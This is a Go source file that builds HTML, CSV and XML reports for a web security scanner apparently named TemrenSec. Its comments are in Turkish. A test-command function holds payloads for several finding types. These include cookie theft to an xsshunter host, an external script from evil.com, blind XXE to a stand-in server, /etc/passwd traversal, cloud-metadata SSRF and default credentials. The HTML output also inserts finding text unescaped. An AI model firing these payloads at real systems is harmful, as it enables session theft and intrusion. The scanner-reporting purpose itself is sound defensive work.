package report

import (
	"bytes"
	"fmt"
	"net/smtp"
	"os"
	"strings"
	"time"

	"github.com/temren/pkg/scanner"
)

type ReportConfig struct {
	Target      string
	SenderEmail string
	SenderPass  string
	SMTPHost    string
	SMTPPort    string
	ToEmail     string
}

type Report struct {
	Target        string
	Timestamp     time.Time
	TotalFindings int
	Summary       map[string]int
	Findings      []scanner.Finding
	Config        ReportConfig
}

func NewReport(target string, findings []scanner.Finding, cfg ReportConfig) *Report {
	summary := make(map[string]int)
	for _, f := range findings {
		summary[string(f.Severity)]++
	}

	return &Report{
		Target:        target,
		Timestamp:     time.Now(),
		TotalFindings: len(findings),
		Summary:       summary,
		Findings:      findings,
		Config:        cfg,
	}
}

func (r *Report) GenerateHTML() string {
	var buf bytes.Buffer

	buf.WriteString(fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
<style>
body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
.container { max-width: 900px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
h1 { color: #333; border-bottom: 3px solid #e74c3c; padding-bottom: 10px; }
h2 { color: #555; margin-top: 30px; }
.header { display: flex; justify-content: space-between; align-items: center; }
.summary { display: flex; gap: 20px; margin: 20px 0; }
.summary-card { flex: 1; padding: 20px; border-radius: 8px; text-align: center; color: white; }
.critical { background: #e74c3c; }
.high { background: #e67e22; }
.medium { background: #f39c12; }
.low { background: #3498db; }
.info { background: #95a5a6; }
.finding { background: #f8f9fa; border-left: 4px solid #e74c3c; padding: 15px; margin: 15px 0; border-radius: 4px; }
.finding.high-severity { border-left-color: #e74c3c; }
.finding.medium-severity { border-left-color: #f39c12; }
.finding.low-severity { border-left-color: #3498db; }
.finding.info-severity { border-left-color: #95a5a6; }
.severity-badge { display: inline-block; padding: 4px 12px; border-radius: 4px; color: white; font-weight: bold; font-size: 12px; }
.severity-critical { background: #e74c3c; }
.severity-high { background: #e67e22; }
.severity-medium { background: #f39c12; }
.severity-low { background: #3498db; }
.severity-info { background: #95a5a6; }
.test-box { background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 4px; margin-top: 10px; font-family: monospace; }
.test-box strong { color: #f1c40f; }
.footer { margin-top: 40px; text-align: center; color: #7f8c8d; font-size: 12px; }
</style>
</head>
<body>
<div class="container">
<h1>🛡️ TemrenSec Güvenlik Tarama Raporu</h1>

<div class="header">
<div>
<strong>Hedef:</strong> %s<br>
<strong>Tarih:</strong> %s<br>
</div>
</div>

<h2>📊 Özet</h2>
<div class="summary">
<div class="summary-card critical"><strong>%d</strong><br>Critical</div>
<div class="summary-card high"><strong>%d</strong><br>High</div>
<div class="summary-card medium"><strong>%d</strong><br>Medium</div>
<div class="summary-card low"><strong>%d</strong><br>Low</div>
<div class="summary-card info"><strong>%d</strong><br>Info</div>
</div>

<h2>🔍 Detaylı Bulgular</h2>
`, r.Target, r.Timestamp.Format("02.01.2006 15:04:05"),
		r.Summary["CRITICAL"], r.Summary["HIGH"], r.Summary["MEDIUM"], r.Summary["LOW"], r.Summary["INFO"]))

	for i, f := range r.Findings {
		severityClass := strings.ToLower(string(f.Severity))
		testCommands := r.generateTestCommands(f)

		confidenceBadge := ""
		if f.Confidence != "" {
			confidenceClass := strings.ToLower(string(f.Confidence))
			confidenceBadge = fmt.Sprintf(` <span class="severity-badge severity-%s">Confidence: %s</span>`, confidenceClass, f.Confidence)
		}

		buf.WriteString(fmt.Sprintf(`
<div class="finding %s-severity">
<span class="severity-badge severity-%s">%s</span>%s
<h3>%d. %s</h3>
<p><strong>URL:</strong> <a href="%s">%s</a></p>
<p><strong>Scanner:</strong> %s</p>
<p><strong>Açıklama:</strong> %s</p>
`, severityClass, severityClass, f.Severity, confidenceBadge, i+1, f.Title, f.URL, f.URL, f.Scanner, f.Description))

		if f.Payload != "" {
			buf.WriteString(fmt.Sprintf(`<p><strong>Kullanılan Payload:</strong> <code>%s</code></p>`, f.Payload))
		}

		if f.Evidence != "" {
			buf.WriteString(fmt.Sprintf(`<p><strong>Kanıt:</strong> %s</p>`, f.Evidence))
		}

		if testCommands != "" {
			buf.WriteString(fmt.Sprintf(`
<div class="test-box">
<strong>🧪 Nasıl Test Edilir:</strong><br><br>
%s
</div>
`, testCommands))
		}

		buf.WriteString("</div>")
	}

	complianceEntries := r.generateComplianceTable()
	if complianceEntries != "" {
		buf.WriteString(complianceEntries)
	}

	buf.WriteString(fmt.Sprintf(`
<div class="footer">
<p>TemrenSec Güvenlik Tarayıcı v1.0 | Bu rapor otomatik olarak oluşturulmuştur.</p>
<p>Rapor ID: %s</p>
</div>
</div>
</body>
</html>
`, r.Timestamp.Format("20060102150405")))

	return buf.String()
}

func (r *Report) generateComplianceTable() string {
	var buf bytes.Buffer
	var allMappings []struct {
		Finding   scanner.Finding
		Mappings  []ComplianceMapping
	}

	seen := make(map[string]bool)
	for _, f := range r.Findings {
		mappings := MapToCompliance(f)
		if len(mappings) > 0 && !seen[f.Scanner+f.Title] {
			seen[f.Scanner+f.Title] = true
			allMappings = append(allMappings, struct {
				Finding  scanner.Finding
				Mappings []ComplianceMapping
			}{f, mappings})
		}
	}

	if len(allMappings) == 0 {
		return ""
	}

	buf.WriteString(`
<h2>📋 Compliance Mapping</h2>
<table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
<thead>
<tr style="background: #2c3e50; color: white;">
<th style="padding: 10px; text-align: left;">Finding</th>
<th style="padding: 10px; text-align: left;">Framework</th>
<th style="padding: 10px; text-align: left;">Control ID</th>
<th style="padding: 10px; text-align: left;">Control Name</th>
</tr>
</thead>
<tbody>
`)

	row := 0
	for _, entry := range allMappings {
		for _, m := range entry.Mappings {
			bgColor := "#f8f9fa"
			if row%2 == 1 {
				bgColor = "#ffffff"
			}
			frameworkColor := "#3498db"
			switch m.Framework {
			case PCIDSS:
				frameworkColor = "#e74c3c"
			case SOC2:
				frameworkColor = "#2ecc71"
			case ISO27001:
				frameworkColor = "#f39c12"
			}
			buf.WriteString(fmt.Sprintf(`<tr style="background: %s;">
<td style="padding: 8px; border-bottom: 1px solid #ddd;">%s</td>
<td style="padding: 8px; border-bottom: 1px solid #ddd;"><span style="color: %s; font-weight: bold;">%s</span></td>
<td style="padding: 8px; border-bottom: 1px solid #ddd;">%s</td>
<td style="padding: 8px; border-bottom: 1px solid #ddd;">%s</td>
</tr>
`, bgColor, entry.Finding.Title, frameworkColor, m.Framework, m.ControlID, m.ControlName))
			row++
		}
	}

	buf.WriteString(`</tbody></table>`)
	return buf.String()
}

func (r *Report) generateTestCommands(f scanner.Finding) string {
	switch f.Scanner {
	case "SQL Injection":
		return fmt.Sprintf(`# SQL Injection Test
# 1. Manuel test için tarayıcıda veya curl ile:

curl -X GET "%s?param=%s"

# 2. SQLMap ile doğrulama:
sqlmap -u "%s" --batch --level=5 --risk=3

# 3. Parametre değerini değiştirerek tepkiyi gözlemleyin
# Hata mesajları veya yanıt süresi artışı güvenlik açığı işaretidir.`, f.URL, f.Payload, f.URL)

	case "Cross-Site Scripting (XSS)":
		return fmt.Sprintf(`# XSS Test
# 1. Tarayıcıda URL'yi açın:
%s

# 2. DOM XSS için tarayıcı konsolunda:
document.write(location.href);

# 3. XSS Hunter ile:
<img src=x onerror="this.src='https://your.xsshunter.com/?'+document.cookie">

# 4. Alert pop-up tetiklenmesi açığı doğrular`, f.URL)

	case "Command Injection":
		return fmt.Sprintf(`# Command Injection Test (DİKKAT: Yalnızca yetkili ortamda!)
# 1. Ping testi:
curl "%s?cmd=ping+-c+3+127.0.0.1"

# 2. Sistembilgisi alma:
curl "%s?cmd=whoami"

# 3. Dikkat: Gerçek sistem komutları ÇALIŞTIRMAYIN, yalnızca yanıtı gözlemleyin`, f.URL, f.URL)

	case "Server-Side Request Forgery (SSRF)":
		return fmt.Sprintf(`# SSRF Test
# 1. Localhost erişimi:
curl "%s?url=http://127.0.0.1:80"

# 2. Cloud metadata erişimi (AWS):
curl "%s?url=http://169.254.169.254/latest/meta-data/"

# 3. Internal service erişimi:
curl "%s?url=http://localhost:22"`, f.URL, f.URL, f.URL)

	case "Path Traversal":
		return fmt.Sprintf(`# Path Traversal Test
# 1. Linux:
curl "%s?file=../../../../etc/passwd"

# 2. Windows:
curl "%s?file=..\\..\\..\\windows\\win.ini"

# 3. Null byte:
curl "%s?file=../../../../etc/passwd%%00.jpg"`, f.URL, f.URL, f.URL)

	case "XML External Entity (XXE)":
		return fmt.Sprintf(`# XXE Test
# 1. XXE payload gönder:
curl -X POST "%s" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

# 2. Blind XXE test:
curl -X POST "%s" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://yourserver.com/see">]><foo>&xxe;</foo>'`, f.URL, f.URL)

	case "Insecure Direct Object Reference (IDOR)":
		return fmt.Sprintf(`# IDOR Test
# 1. ID parametresini değiştirin:
# Orijinal: %s
# Değişiklik: ID'yi 1, 2, 3... olarak değiştirin

# 2. Yetki kontrolü olmadan erişim sağlanıyor mu kontrol edin
curl -X GET "%s"

# 3. object-enumeration: Farklı ID değerleri deneyin`, f.URL, f.URL)

	case "Authentication Failures":
		return fmt.Sprintf(`# Auth Failure Test
# 1. Default credentials deneyin:
admin/admin, admin/password, root/root, user/user

# 2. Brute force koruması var mı kontrol:
# 5 ardışık başarısız giriş denemesi yapın

# 3. curl ile:
curl -X POST "%s" -d "username=admin&password=admin"`, f.URL)

	case "Missing Content-Security-Policy Header":
		return fmt.Sprintf(`# CSP Bypass Test
# 1. CSP olmadan XSS çalıştırılabilir:
# <script>alert(document.domain)</script>

# 2. Browser Console'da CSP değerini kontrol:
console.log(document.cookie)

# 3. CSP bypass teknikleri:
# - Inline script: <script>alert(1)</script>
# - Event handlers: <img src=x onerror=alert(1)>
# - External script: <script src="http://evil.com/xss.js"></script>`)

	case "Vulnerable Components":
		return fmt.Sprintf(`# Bileşen Testi
# 1. Versiyon kontrolü:
# %s

# 2. Exploit-DB veya NVD'de bilinen açıkları ara:
searchsploit %s

# 3. npm/Composer audit:
npm audit
# veya
composer audit`, f.Payload, f.Payload)

	default:
		return "Detaylı test için güvenlik uzmanına danışın."
	}
}

func (r *Report) SendEmail() error {
	html := r.GenerateHTML()

	subject := fmt.Sprintf("🛡️ Güvenlik Raporu: %s - %d Bulgu", r.Target, r.TotalFindings)

	msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: %s\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n%s",
		r.Config.SenderEmail, r.Config.ToEmail, subject, html)

	auth := smtp.PlainAuth("", r.Config.SenderEmail, r.Config.SenderPass, r.Config.SMTPHost)

	addr := fmt.Sprintf("%s:%s", r.Config.SMTPHost, r.Config.SMTPPort)
	err := smtp.SendMail(addr, auth, r.Config.SenderEmail, []string{r.Config.ToEmail}, []byte(msg))

	return err
}

func (r *Report) SaveHTML(filename string) error {
	html := r.GenerateHTML()
	return writeFile(filename, []byte(html))
}

func writeFile(filename string, data []byte) error {
	return os.WriteFile(filename, data, 0644)
}

func (r *Report) GenerateCSV() string {
	var buf bytes.Buffer

	buf.WriteString("ID,Title,Severity,Confidence,URL,Parameter,Payload,OWASP Category,CVSS Score,Status,Created At\n")

	for i, f := range r.Findings {
		severity := string(f.Severity)
		if severity == "" {
			severity = "INFO"
		}

		confidence := string(f.Confidence)
		if confidence == "" {
			confidence = "N/A"
		}
		
		cvss := getCVSSScore(f.Severity)
		
		buf.WriteString(fmt.Sprintf("%d,%s,%s,%s,%s,%s,%s,%s,%.1f,open,%s\n",
			i+1,
			escapeCSV(f.Title),
			severity,
			confidence,
			escapeCSV(f.URL),
			escapeCSV(f.Parameter),
			escapeCSV(f.Payload),
			escapeCSV(mapScannerToOWASP(f.Scanner)),
			cvss,
			r.Timestamp.Format("2006-01-02 15:04:05"),
		))
	}

	return buf.String()
}

func (r *Report) GenerateXML() string {
	var buf bytes.Buffer

	buf.WriteString(`<?xml version="1.0" encoding="UTF-8"?>` + "\n")
	buf.WriteString(fmt.Sprintf(`<report>
  <target>%s</target>
  <timestamp>%s</timestamp>
  <summary>
    <critical>%d</critical>
    <high>%d</high>
    <medium>%d</medium>
    <low>%d</low>
    <info>%d</info>
    <total>%d</total>
  </summary>
  <findings>
`, r.Target, r.Timestamp.Format(time.RFC3339),
		r.Summary["CRITICAL"], r.Summary["HIGH"], r.Summary["MEDIUM"], r.Summary["LOW"], r.Summary["INFO"], r.TotalFindings))

	for i, f := range r.Findings {
		severity := string(f.Severity)
		if severity == "" {
			severity = "INFO"
		}
		cvss := getCVSSScore(f.Severity)

		buf.WriteString(fmt.Sprintf(`    <finding id="%d">
      <title>%s</title>
      <severity>%s</severity>
      <confidence>%s</confidence>
      <url>%s</url>
      <parameter>%s</parameter>
      <payload><![CDATA[%s]]></payload>
      <owasp_category>%s</owasp_category>
      <cvss_score>%.1f</cvss_score>
      <description><![CDATA[%s]]></description>
      <evidence><![CDATA[%s]]></evidence>
    </finding>
`, i+1,
			escapeXML(f.Title),
			severity,
			escapeXML(string(f.Confidence)),
			escapeXML(f.URL),
			escapeXML(f.Parameter),
			f.Payload,
			escapeXML(mapScannerToOWASP(f.Scanner)),
			cvss,
			escapeXML(f.Description),
			escapeXML(f.Evidence),
		))
	}

	buf.WriteString(`  </findings>
</report>`)

	return buf.String()
}

func (r *Report) SaveCSV(filename string) error {
	csv := r.GenerateCSV()
	return writeFile(filename, []byte(csv))
}

func (r *Report) SaveXML(filename string) error {
	xml := r.GenerateXML()
	return writeFile(filename, []byte(xml))
}

func (r *Report) ExportToFile(filename string, format string) error {
	switch format {
	case "csv":
		return r.SaveCSV(filename)
	case "xml":
		return r.SaveXML(filename)
	case "html":
		return r.SaveHTML(filename)
	case "sarif":
		return r.SaveSARIF(filename)
	case "junit":
		return r.SaveJUnit(filename)
	default:
		return fmt.Errorf("unsupported format: %s", format)
	}
}

func escapeCSV(s string) string {
	if strings.Contains(s, ",") || strings.Contains(s, "\"") || strings.Contains(s, "\n") {
		return "\"" + strings.ReplaceAll(s, "\"", "\"\"") + "\""
	}
	return s
}

func escapeXML(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, "\"", "&quot;")
	s = strings.ReplaceAll(s, "'", "&apos;")
	return s
}

func getCVSSScore(severity scanner.Severity) float64 {
	switch severity {
	case scanner.SeverityCritical:
		return 9.5
	case scanner.SeverityHigh:
		return 7.5
	case scanner.SeverityMedium:
		return 5.0
	case scanner.SeverityLow:
		return 2.5
	default:
		return 0.0
	}
}

func mapScannerToOWASP(scannerName string) string {
	mapping := map[string]string{
		"SQL Injection":         "A06:2021",
		"XSS":                   "A06:2021",
		"Command Injection":     "A06:2021",
		"SSRF":                  "A06:2021",
		"IDOR":                  "A01:2021",
		"Path Traversal":        "A01:2021",
		"XXE":                   "A05:2021",
		"Auth Failure":          "A07:2021",
		"Vulnerable Components": "A06:2021",
		"Logging & Monitoring":  "A09:2021",
		"Insecure Design":       "A04:2021",
		"Error Handling":        "A05:2021",
		"Supply Chain":          "A08:2021",
		"Security Headers":      "A05:2021",
		"SSL/TLS":               "A02:2021",
		"Sensitive Data":        "A02:2021",
		"CORS":                  "A05:2021",
		"Backup File":           "A05:2021",
		"Directory Brute Force": "A01:2021",
		"JWT":                   "A07:2021",
		"GraphQL":               "A06:2021",
		"Open Redirect":         "A01:2021",
		"Prototype Pollution":   "A06:2021",
		"Cloud Leak":            "A05:2021",
	}
	if cat, ok := mapping[scannerName]; ok {
		return cat
	}
	return "A00:2021"
}
